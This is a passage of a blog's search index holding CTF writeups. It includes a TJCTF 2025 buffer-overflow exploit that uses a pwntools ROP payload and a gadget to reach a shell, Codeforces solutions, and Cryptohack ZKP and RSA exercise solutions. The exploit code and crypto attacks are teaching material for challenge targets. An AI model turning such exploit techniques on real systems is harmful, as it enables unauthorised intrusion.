(a2)r.sendline(payload)r.recvline()print(r.recvline())# b&#x27;HTB&#123;0ur_Buff3r_1s_not_healthy&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"}]},{"title":"TJCTF 2025 pwn/i-love-birds Writeup","slug":"CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup","date":"2025-06-09T09:53:30.000Z","updated":"2025-06-10T19:01:56.328Z","comments":true,"path":"2025/06/09/CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/09/CTF/Pwn/TJCTF-2025-pwn-i-love-birds-Writeup/","excerpt":"TJCTF 2025比赛的Pwn题i-love-birds的题解。通过Buffer Overflow修改返回地址以调用目标函数，并且使用pop rbi;ret来传递参数。","text":"题目 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gadget() &#123; asm(&quot;push $0x69;pop %rdi&quot;);&#125;void win(int secret) &#123; if (secret == 0xA1B2C3D4) &#123; system(&quot;/bin/sh&quot;); &#125;&#125;int main() &#123; setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); unsigned int canary = 0xDEADBEEF; char buf[64]; puts(&quot;I made a canary to stop buffer overflows. Prove me wrong!&quot;); gets(buf); if (canary != 0xDEADBEEF) &#123; puts(&quot;No stack smashing for you!&quot;); exit(1); &#125; return 0;&#125; 分析首先注意到这道题最核心的漏洞： 12char buf[64];gets(buf); 也就是利用Buffer Overflow。 虽然说设置了Stack Canary，但是由于知道它的值，直接在Oveflow的时候保证它的值没有被修改即可。 我们一共需要做到2件事情： 调用win()函数 给win()函数传递0xA1B2C3D4作为参数 在IDA的Exports页面便可直接查看win()函数的地址： 1win 00000000004011C4 其次便是传递参数了。首先查看gadget函数（在上面的Exports页面直接点击gadget即可）： 12345678text:00000000004011B6 endbr64.text:00000000004011BA push rbp.text:00000000004011BB mov rbp, rsp.text:00000000004011BE push 69h ; &#x27;i&#x27;.text:00000000004011C0 pop rdi.text:00000000004011C1 nop.text:00000000004011C2 pop rbp.text:00000000004011C3 retn 发现我们可以直接利用pop rdi以及retn/ret来传递参数。不过这里和最常见的pop rdi; ret不同的是，这两个命令中间还隔了其他内容，所以我们需要在中间部分插入Padding保证所有的位置都是正确的。 除了直接查看gadget函数，我们还可以直接通过使用Alt + t搜索pop 或者是通过Alt + B搜索5F 来找到pop rdi这条命令。（如果是查找pop rdi; ret的话则需要搜索”5F C3“） 最后再查看一下main()函数的Stack的结构： Exploit1234567891011121314151617181920from pwn import *r = remote(&quot;tjc.tf&quot;, 31625)payload = 76 * b&quot;A&quot; # 填满 bufpayload += p32(0xDEADBEEF) # 修复 canary（4字节）payload += 8 * b&quot;C&quot; # saved RBP（可以随便）payload += p64(0x4011c0) # gadget: pop rdipayload += p64(0xA1B2C3D4) # 参数，传入 win()payload+=p64(0x00) # rbp的Padding payload += p64(0x4011C4) # win() 函数地址r.recvuntil(b&quot;Prove me wrong!&quot;)r.sendline(payload)r.interactive()# ls# flag.txt# run# cat flag.txt# tjctf&#123;1_gu355_y0u_f0und_th3_f4ke_b1rd_ch1rp_CH1rp_cH1Rp_Ch1rP_ch1RP&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"}]},{"title":"Codeforces Round 1029 (Div. 3) Writeup","slug":"算法竞赛/Codeforce/Codeforces-Round-1029-Div-3-Writeup","date":"2025-06-08T15:52:05.000Z","updated":"2025-06-15T16:59:38.050Z","comments":true,"path":"2025/06/08/算法竞赛/Codeforce/Codeforces-Round-1029-Div-3-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/08/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/Codeforces-Round-1029-Div-3-Writeup/","excerpt":"","text":"A. False Alarm题目 思路首先先遍历Array直到找到第一个1，即关着的门。然后这个时候使用开关，看是否能到达终点，或者是到达的位置后面是否存在关着的门。 简化下来就是：首先找到第一个关着的门的位置，然后确定最后一个关着的门的位置，最后根据他们的距离是否小于x的值来判断是否可以通行。 代码123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, x; cin &gt;&gt; n &gt;&gt; x; vector&lt;int&gt; a(n); for (int &amp;v : a) cin &gt;&gt; v; int first = -1, last = -1; for (int i = 0; i &lt; n; ++i) { if (a[i] == 1) { if (first == -1) first = i; // 第一次遇到关门 last = i; // 不断刷新最后一次 } } // 必有关门，所以 first、last 一定都被赋值 if (last - first + 1 &lt;= x) cout &lt;&lt; \"YES\\n\"; else cout &lt;&lt; \"NO\\n\"; } return 0;} B. Shrink题目 思路不难发现，对于任意的n，我们只需要构造一个这样的数列即可满足要求： 1,3,5,..,n-1,n,n-2,...,2即前半段是奇数递增，后半段是偶数递减。 代码12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;int main() { int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; // 奇数 for (int i = 1; i &lt;= n; i += 2) { cout &lt;&lt; i &lt;&lt; \" \"; } // 偶数 int start = (n % 2 == 0) ? n : n - 1; for (int i = start; i &gt;= 2; i -= 2) { cout &lt;&lt; i &lt;&lt; \" \"; } cout &lt;&lt; '\\n'; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"}]},{"title":"Cyptohack ZKPs Writeup","slug":"CTF/Crypto/Cyptohack-ZKPs-Writeup","date":"2025-06-07T07:08:55.000Z","updated":"2025-06-07T09:08:22.759Z","comments":true,"path":"2025/06/07/CTF/Crypto/Cyptohack-ZKPs-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/07/CTF/Crypto/Cyptohack-ZKPs-Writeup/","excerpt":"","text":"什么是零知识证明A zero-knowledge proof (ZKP) is a technique that enables one party (the prover) to demonstrate to another party (the verifier) the truth of a certain statement without revealing any additional information besides the fact that the statement is true. The core idea behind zero-knowledge proofs is that while it’s straightforward to prove you have certain knowledge by disclosing it, the real challenge lies in proving you have that knowledge without actually revealing the knowledge itself or any details about it. 零知识证明（Zero-Knowledge Proof，简称ZKP）是一种技术，使一方（称为“证明者”）能够向另一方（称为“验证者”）证明某个陈述的真实性，同时不泄露除该陈述为真这一事实以外的任何其他信息。零知识证明的核心理念在于：尽管通过直接披露信息来证明自己拥有某种知识是较为直接的方式，但真正的挑战在于如何在不暴露该知识本身或其任何细节的前提下，仍能证明自己确实掌握了这项知识。 例子：你需要向你的一位色盲朋友维克多证明，两只形状完全相同的球（一只是红色，另一只是绿色）是不同的，但又不能透露哪只是红的、哪只是绿的。为此，你采用了一种特定的证明系统。 你先向维克多展示这两只球。他由于无法分辨颜色，看不出它们的区别。接着他将球藏起来，随机选出一只给你看，然后可能会将它换成另一只，也可能不换，再次展示给你。你需要判断他是否交换了球。由于你能通过颜色分辨球的不同，你每次都能准确判断他是否更换了球。 这个过程重复足够多的次数（例如50次），而你每次都能正确识别是否换了球，这让维克多确信两只球确实不同，但他依然无法得知哪只是红色，哪只是绿色。这个证明过程没有泄露除“这两只球不同”之外的任何信息，因此，这是一个零知识证明的例子。 Sigma ProtocolZKP Introduction题 解1crypto&#123;1985&#125; 论文链接：https://dl.acm.org/doi/10.1145/22145.22178https://dl.acm.org/doi/pdf/10.1145/22145.22178 Proofs of Knowledge题 注意到： g^z \\equiv g^{r+ew} \\equiv g^r \\cdot (g^w)^e \\equiv ay^e \\text{ mod } p 论文链接：https://cs.au.dk/~ivan/Sigma.pdf 附件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import randomfrom utils import listenerFLAG = &quot;crypto&#123;????????????????????????&#125;&quot;# Diffie-Hellman group (512 bits)# p = 2*q + 1 where p,q are both prime, and 2 modulo p generates a group of order qp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2# w,y for the relation `g^w = y mod P` we want to prove knowledge of# w = random.randint(0,q)# y = pow(g,w,P)w = 0x5a0f15a6a725003c3f65238d5f8ae4641f6bf07ebf349705b7f1feda2c2b051475e33f6747f4c8dc13cd63b9dd9f0d0dd87e27307ef262ba68d21a238be00e83y = 0x514c8f56336411e75d5fa8c5d30efccb825ada9f5bf3f6eb64b5045bacf6b8969690077c84bea95aab74c24131f900f83adf2bfe59b80c5a0d77e8a9601454e5assert (y%p) &gt;= 1assert pow(y, q, p) == 1class Challenge: def __init__(self): self.before_input = &quot;Prove to me that you know an w such that g^w = y mod p. Send me a = g^r mod p for some random r in range(q)\\n&quot; self.state = &quot;CHALLENGE&quot; def challenge(self, msg): if self.state == &quot;CHALLENGE&quot;: # Prover sends a randomly sampled `A` value from Z_p* to verifier self.a = msg[&quot;a&quot;] if (self.a%p) &lt; 1 or pow(self.a, q, p) != 1: self.exit = True return &#123;&quot;error&quot;: &quot;Invalid value&quot;&#125; # Verifier sends a random challenge sampled from range(0, 2^t) where 2^t &lt;= q self.e = random.randint(0,2**511) self.state = &quot;PROVE&quot; return &#123;&quot;e&quot;: self.e, &quot;message&quot;: &quot;send me z = r + e*w mod q&quot;&#125; elif self.state == &quot;PROVE&quot;: # Prover sends z = r + e*w mod q to the Verifier z = msg[&quot;z&quot;] self.exit = True # Verifier checks g^z = A*h^e mod p if pow(g,z,p) == (self.a*pow(y,self.e,p)) % p: return &#123;&quot;flag&quot;: FLAG, &quot;message&quot;: &quot;You convinced me you know an `w` such that g^w = y mod p!&quot;&#125; else: return &#123;&quot;error&quot;: &quot;something went wrong :(&quot;&#125;import builtins; builtins.Challenge = Challenge # hack to enable challenge to be run locally, see https://cryptohack.org/faq/#listenerlistener.start_server(port=13425) 解注意，这里给服务器发送参数必须用JSON格式，它返回的也都是这个格式的。 1234567891011121314151617181920212223242526272829from pwn import *import jsonimport randomp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2w = 0x5a0f15a6a725003c3f65238d5f8ae4641f6bf07ebf349705b7f1feda2c2b051475e33f6747f4c8dc13cd63b9dd9f0d0dd87e27307ef262ba68d21a238be00e83r = remote(&quot;socket.cryptohack.org&quot;, 13425)random_r = random.randint(0, q)a = pow(g, random_r, p)# 发送 a，注意是 JSON 格式r.sendafter(b&quot;for some random r in range(q)\\n&quot;,json.dumps(&#123;&quot;a&quot;: a&#125;).encode())line = r.recvline()response = json.loads(line.decode())e = response[&quot;e&quot;]z = (random_r + e * w) % qr.sendline(json.dumps(&#123;&quot;z&quot;: z&#125;).encode())print(r.recvline().decode())# &#123;&quot;flag&quot;: &quot;crypto&#123;sigma_protocol_complete!&#125;&quot;, &quot;message&quot;: &quot;You convinced me you know an `w` such that g^w = y mod p!&quot;&#125; Special Soundness简单来讲就是如果2次证明使用的是一个a，那么就可以通过这些传递的参数计算出w来。 题 解这道题依旧用的上面提到的Protocol。 由于可以任意挑选$e$的值，所以最简单的办法就是第一轮选择$e_1=1$，第二轮选择$e_2=2$，那么（由于$a_1=a_2$）就有： z_2-z_1 \\equiv (r_1+e_1w) - (r_2+e_2w) \\equiv w \\text{ mod } q1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *import jsonimport randomfrom Crypto.Util.number import long_to_bytesp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2r = remote(&quot;socket.cryptohack.org&quot;, 13426)# 第一轮r.recvuntil(b&quot;such that y = g^w mod p.\\n&quot;)line = r.recvline()response1 = json.loads(line.decode())a1 = response1[&quot;a&quot;]print(response1[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e = 1r.sendline(json.dumps(&#123;&quot;e&quot;: e&#125;).encode())line = r.recvline()response1 = json.loads(line.decode())z1 = response1[&quot;z&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------# 第二轮line = r.recvline()response2 = json.loads(line.decode())a2 = response2[&quot;a2&quot;]print(response2[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e = 2r.sendline(json.dumps(&#123;&quot;e&quot;: e&#125;).encode())line = r.recvline()response2 = json.loads(line.decode())z2 = response2[&quot;z2&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------w = long_to_bytes((z2-z1)%q)print(w)# b&#x27;crypto&#123;specially_sound_sigmas&#125;\\xf7c\\xb0H\\xa1j\\t\\x9f\\x9ab`%\\xf7\\xe3\\x1552\\x15\\xda%\\xf7\\xf5yk\\xd2\\xa7\\x1f\\xbb3\\x8f\\xfd&amp;&#x27; 当然其实选择随机的$e$也可以计算出$w$： w \\equiv (z_2-z_1) \\cdot (e_2-e_1)^{-1} \\text{ mod } q1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *import jsonimport randomfrom Crypto.Util.number import long_to_bytesp = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55efq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7g = 2r = remote(&quot;socket.cryptohack.org&quot;, 13426)# 第一轮r.recvuntil(b&quot;such that y = g^w mod p.\\n&quot;)line = r.recvline()response1 = json.loads(line.decode())a1 = response1[&quot;a&quot;]print(response1[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e1 = randint(0,2**511)r.sendline(json.dumps(&#123;&quot;e&quot;: e1&#125;).encode())line = r.recvline()response1 = json.loads(line.decode())z1 = response1[&quot;z&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------# 第二轮line = r.recvline()response2 = json.loads(line.decode())a2 = response2[&quot;a2&quot;]print(response2[&quot;message&quot;])# send random e in range 0 &lt;= e &lt; 2^511e2 = randint(0,2**511)r.sendline(json.dumps(&#123;&quot;e&quot;: e2&#125;).encode())line = r.recvline()response2 = json.loads(line.decode())z2 = response2[&quot;z2&quot;]print(response1[&quot;message&quot;])# not convinced? I&#x27;ll happily do it again!# --------------------------------------------------------------------w = long_to_bytes((z2-z1) * pow(e2-e1,-1,q)%q)print(w)# b&#x27;crypto&#123;specially_sound_sigmas&#125;\\xf7c\\xb0H\\xa1j\\t\\x9f\\x9ab`%\\xf7\\xe3\\x1552\\x15\\xda%\\xf7\\xf5yk\\xd2\\xa7\\x1f\\xbb3\\x8f\\xfd&amp;&#x27; **题解**题解","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/en/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/en/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"Zero-knowledge proofs","slug":"Zero-knowledge-proofs","permalink":"https://archer-baiyi.github.io/en/tags/Zero-knowledge-proofs/"},{"name":"零知识证明","slug":"零知识证明","permalink":"https://archer-baiyi.github.io/en/tags/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"}]},{"title":"Cyptohack Public-Key_Cryptography Writeup","slug":"CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup","date":"2025-06-03T18:29:30.000Z","updated":"2025-06-04T15:14:35.566Z","comments":true,"path":"2025/06/03/CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/03/CTF/Crypto/Cyptohack-Public-Key-Cryptography-Writeup/","excerpt":"","text":"这个Course里有很大一部分都是关于RSA加密的。关于RSA的基本原理以及基本的攻击方法可以看我的另一篇博客：RSA加解密以及攻击方法。 Modular Exponentiation题 解12print(pow(101,17,22663))# 19906 Public Keys题 解12print(pow(12,65537,17*23))# 301 Euler’s Totient题 解12345p = 857504083339712752489993810777q = 1029224947942998075080348647219phi = (p-1)*(q-1)print(phi)# 882564595536224140639625987657529300394956519977044270821168 Private Keys题 解1234567p = 857504083339712752489993810777q = 1029224947942998075080348647219phi = (p-1)*(q-1)e = 65537d = pow(e,-1,phi)print(d)# 121832886702415731577073962957377780195510499965398469843281 RSA Decryption题 解不难发现这个N就是前几道题给的p,q的乘积。 1234567891011p = 857504083339712752489993810777q = 1029224947942998075080348647219N = 882564595536224140639625987659416029426239230804614613279163assert N == p*qphi = (p-1)*(q-1)e = 65537d = pow(e,-1,phi)c = 77578995801157823671636298847186723593814843845525223303932m = pow(c,d,N)print(m)# 13371337 RSA Signatures题 解12345678910111213141516from Crypto.Hash import SHA256from Crypto.Util.number import bytes_to_longN = 15216583654836731327639981224133918855895948374072384050848479908982286890731769486609085918857664046075375253168955058743185664390273058074450390236774324903305663479046566232967297765731625328029814055635316002591227570271271445226094919864475407884459980489638001092788574811554149774028950310695112688723853763743238753349782508121985338746755237819373178699343135091783992299561827389745132880022259873387524273298850340648779897909381979714026837172003953221052431217940632552930880000919436507245150726543040714721553361063311954285289857582079880295199632757829525723874753306371990452491305564061051059885803d = 11175901210643014262548222473449533091378848269490518850474399681690547281665059317155831692300453197335735728459259392366823302405685389586883670043744683993709123180805154631088513521456979317628012721881537154107239389466063136007337120599915456659758559300673444689263854921332185562706707573660658164991098457874495054854491474065039621922972671588299315846306069845169959451250821044417886630346229021305410340100401530146135418806544340908355106582089082980533651095594192031411679866134256418292249592135441145384466261279428795408721990564658703903787956958168449841491667690491585550160457893350536334242689message = b&quot;crypto&#123;Immut4ble_m3ssag1ng&#125;&quot;h = SHA256.new(message).digest()h_int = bytes_to_long(h)signature = pow(h_int, d, N)print(signature)# 13480738404590090803339831649238454376183189744970683129909766078877706583282422686710545217275797376709672358894231550335007974983458408620258478729775647818876610072903021235573923300070103666940534047644900475773318682585772698155617451477448441198150710420818995347235921111812068656782998168064960965451719491072569057636701190429760047193261886092862024118487826452766513533860734724124228305158914225250488399673645732882077575252662461860972889771112594906884441454355959482925283992539925713424132009768721389828848907099772040836383856524605008942907083490383109757406940540866978237471686296661685839083475 Factoring题 解使用 http://www.factordb.com/index.php 得到p,q 12p = 19704762736204164635843q = 25889363174021185185929 Monoprime题 1234n = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591 e = 65537ct = 161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942 解12345678910from Crypto.Util.number import long_to_bytes, inversen = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591e = 65537ct = 161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942d = inverse(e, n-1)m = pow(ct, d, n)print(long_to_bytes(m))# b&#x27;crypto&#123;0n3_pr1m3_41n7_pr1m3_l0l&#125;&#x27; Manyprime题 解可以使用sage的ecm.factor()函数： 12345678910111213141516171819from Crypto.Util.number import long_to_bytesfrom sage.all import *n = 580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637e = 65537ct = 320721490534624434149993723527322977960556510750628354856260732098109692581338409999983376131354918370047625150454728718467998870322344980985635149656977787964380651868131740312053755501594999166365821315043312308622388016666802478485476059625888033017198083472976011719998333985531756978678758897472845358167730221506573817798467100023754709109274265835201757369829744113233607359526441007577850111228850004361838028842815813724076511058179239339760639518034583306154826603816927757236549096339501503316601078891287408682099750164720032975016814187899399273719181407940397071512493967454225665490162619270814464factors = ecm.factor(n)phi = prod([f - 1 for f in factors])d = inverse_mod(e, phi)m = pow(ct, d, n)flag = long_to_bytes(m)print(flag.decode())# crypto&#123;700_m4ny_5m4ll_f4c70r5&#125; Salty题 1234567891011121314151617181920212223242526#!/usr/bin/env python3from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytese = 1d = -1while d == -1: p = getPrime(512) q = getPrime(512) phi = (p - 1) * (q - 1) d = inverse(e, phi)n = p * qflag = b&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;pt = bytes_to_long(flag)ct = pow(pt, e, n)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;ct = &#123;ct&#125;&quot;)pt = pow(ct, d, n)decrypted = long_to_bytes(pt)assert decrypted == flag 123n = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767 e = 1ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485 解e选的是1，根本没有起到任何加密的效果。 1234567from Crypto.Util.number import long_to_bytesn = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767 e = 1ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485flag = long_to_bytes(ct)print(flag)# b&#x27;crypto&#123;saltstack_fell_for_this!&#125;&#x27; Modulus Inutilis题 1234567891011121314151617181920212223242526#!/usr/bin/env python3from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytese = 3d = -1while d == -1: p = getPrime(1024) q = getPrime(1024) phi = (p - 1) * (q - 1) d = inverse(e, phi)n = p * qflag = b&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;pt = bytes_to_long(flag)ct = pow(pt, e, n)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;ct = &#123;ct&#125;&quot;)pt = pow(ct, d, n)decrypted = long_to_bytes(pt)assert decrypted == flag 123n = 17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883e = 3ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957 解e选的太小了，且ct也比n小很多，所以直接开3次根就好。 123456789from sympy import rootfrom Crypto.Util.number import long_to_bytesn = 17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883e = 3ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957flag = root(ct, e)print(long_to_bytes(flag))# b&#x27;crypto&#123;N33d_m04R_p4dd1ng&#125;&#x27; Working with Fields题 解1234p=991g=209print(pow(g,-1,p))# 569 Generators of Groups题 解设g为$\\mathbb{F}_p$的 primitive element，则有 g^{p-1} \\equiv 1 \\text{ mod }p并且 \\forall k \\leq p-1: g^{k} \\not\\equiv 1 \\text{ mod }p实际上因为费马小定理，所有的元素都满足第一个等式，并且根据拉格朗日定理可以得到所有元素的order都是$p-1$的因数。所以有 g \\in \\mathbb{F}_p \\text{ is primitive} \\Longleftrightarrow \\forall p_i \\mid p: g^{p_i} \\not\\equiv 1 \\text{ mod }p利用这个办法我们可以快速判断一个元素是否是primitive element。 1234567891011121314151617181920from sympy import isprime, factorintdef find_primitive_root(p): assert isprime(p) phi = p - 1 factors = factorint(phi).keys() for g in range(2, p): is_primitive = True for q in factors: if pow(g, phi // q, p) == 1: is_primitive = False break if is_primitive: return gp = 28151primitive = find_primitive_root(p)print(primitive)# 7 Computing Public Values题 解123456g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919a=972107443837033796245864316200458246846904598488981605856765890478853088246897345487328491037710219222038930943365848626194109830309179393018216763327572120124760140018038673999837643377590434413866611132403979547150659053897355593394492586978400044375465657296027592948349589216415363722668361328689588996541370097559090335137676411595949335857341797148926151694299575970292809805314431447043469447485957669949989090202320234337890323293401862304986599884732815A=pow(g,a,p)print(A)# 1806857697840726523322586721820911358489420128129248078673933653533930681676181753849411715714173604352323556558783759252661061186320274214883104886050164368129191719707402291577330485499513522368289395359523901406138025022522412429238971591272160519144672389532393673832265070057319485399793101182682177465364396277424717543434017666343807276970864475830391776403957550678362368319776566025118492062196941451265638054400177248572271342548616103967411990437357924 Computing Shared Secrets题 解1234567891011g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919A=70249943217595468278554541264975482909289174351516133994495821400710625291840101960595720462672604202133493023241393916394629829526272643847352371534839862030410331485087487331809285533195024369287293217083414424096866925845838641840923193480821332056735592483730921055532222505605661664236182285229504265881752580410194731633895345823963910901731715743835775619780738974844840425579683385344491015955892106904647602049559477279345982530488299847663103078045601b=12019233252903990344598522535774963020395770409445296724034378433497976840167805970589960962221948290951873387728102115996831454482299243226839490999713763440412177965861508773420532266484619126710566414914227560103715336696193210379850575047730388378348266180934946139100479831339835896583443691529372703954589071507717917136906770122077739814262298488662138085608736103418601750861698417340264213867753834679359191427098195887112064503104510489610448294420720B=518386956790041579928056815914221837599234551655144585133414727838977145777213383018096662516814302583841858901021822273505120728451788412967971809038854090670743265187138208169355155411883063541881209288967735684152473260687799664130956969450297407027926009182761627800181901721840557870828019840218548188487260441829333603432714023447029942863076979487889569452186257333512355724725941390498966546682790608125613166744820307691068563387354936732643569654017172shared_secret = pow(A,b,p)print(shared_secret)# 1174130740413820656533832746034841985877302086316388380165984436672307692443711310285014138545204369495478725102882673427892104539120952393788961051992901649694063179853598311473820341215879965343136351436410522850717408445802043003164658348006577408558693502220285700893404674592567626297571222027902631157072143330043118418467094237965591198440803970726604537807146703763571606861448354607502654664700390453794493176794678917352634029713320615865940720837909466 Deriving Symmetric Keys题 